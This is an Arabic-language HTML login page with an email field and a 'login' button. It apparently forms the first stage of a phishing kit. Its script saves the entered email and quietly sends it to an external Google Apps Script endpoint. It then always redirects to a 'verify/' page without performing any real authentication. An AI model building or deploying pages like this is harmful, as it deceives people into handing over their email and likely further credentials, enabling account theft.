<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; margin: 0; display: flex; justify-content: center; background-color: #EAF0E9; min-height: 100vh; }
        #container { max-width: 400px; width: 100%; padding: 40px 20px; }
        .welcome-text { font-size: 26px; font-weight: bold; margin-bottom: 25px; text-align: right; }
        .input-field { width: 100%; padding: 18px; margin-bottom: 20px; border: 1px solid #c8d1c7; border-radius: 12px; font-size: 18px; box-sizing: border-box; text-align: right; outline: none; }
        .submit-btn { width: 100%; background-color: #2EAF4A; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .submit-btn:disabled { opacity: 0.6; }
    </style>
</head>
<body>
<div id="container">
    <div class="welcome-text">مرحبا</div>
    <input type="email" id="userEmail" placeholder="البريد الإلكتروني" class="input-field">
    <button id="submitBtn" onclick="handleLogin()" class="submit-btn">ولوج</button>
</div>

<script>
    async function handleLogin() {
        const email = document.getElementById('userEmail').value.trim();
        if (!email) return alert("المرجو إدخال البريد");

        // *** تخزين الإيميل محلياً ***
        localStorage.setItem('storedEmail', email);

        const btn = document.getElementById('submitBtn');
        btn.disabled = true;
        btn.innerText = "جاري التحقق...";

        const scriptURL = 'https://script.google.com/macros/s/AKfycbxy-1Z37l9ynTk10ndPsF4iu7D4I41Ag3KUwnx8KnGKf7yrGSN0IB3u3glol4daSMQCuA/exec';

        try {
            // إرسال الطلب الأول للسكريبت
            await fetch(`${scriptURL}?email=${encodeURIComponent(email)}`, { mode: 'no-cors' });
            window.location.href = "verify/";
        } catch (e) {
            window.location.href = "verify/";
        }
    }
</script>
</body>
</html>
